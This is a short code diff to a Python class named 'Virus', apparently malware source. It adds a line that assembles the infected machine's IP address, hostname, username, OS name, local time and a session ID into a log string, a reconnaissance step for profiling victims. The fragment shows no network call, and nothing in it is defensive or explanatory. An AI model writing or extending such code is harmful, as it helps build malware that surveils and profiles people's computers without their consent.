@@ -70,3 +70,5 @@ class Virus(object):
                 except Exception:
                     time.sleep(1)
                     continue
+            
+            loginfo = f"IP: {ip_address}\nHostname: {socket.gethostname()}\nUser: {os.environ.get('username')}\nOS Name: {os.name}\nLocal Time: {datetime.now()}\nSession ID: {self.SESSION_ID}\n\n"
